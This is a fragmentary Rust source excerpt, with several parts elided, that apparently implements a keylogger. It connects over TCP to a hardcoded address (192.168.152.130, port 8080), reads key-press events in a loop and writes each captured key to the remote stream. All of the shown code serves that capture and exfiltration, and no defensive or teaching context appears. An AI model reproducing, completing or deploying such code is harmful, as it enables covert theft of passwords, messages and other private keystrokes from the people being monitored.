...
const CLIENT_IP: &str = "192.168.152.130"; // Change this to your client's IP address
const CLIENT_PORT: u16 = 8080; // Change this to your desired port
...
fn main() {
  ...
  let mut stream = TcpStream::connect((CLIENT_IP, CLIENT_PORT))
  ...
  */
  ...
  loop {
    ...
    if value == KEY_PRESS && (code as usize) < MAX_KEYS as usize {
      let key = arr[code as usize];
      write!(stream, "{}", key).expect("Failed to send data to server");
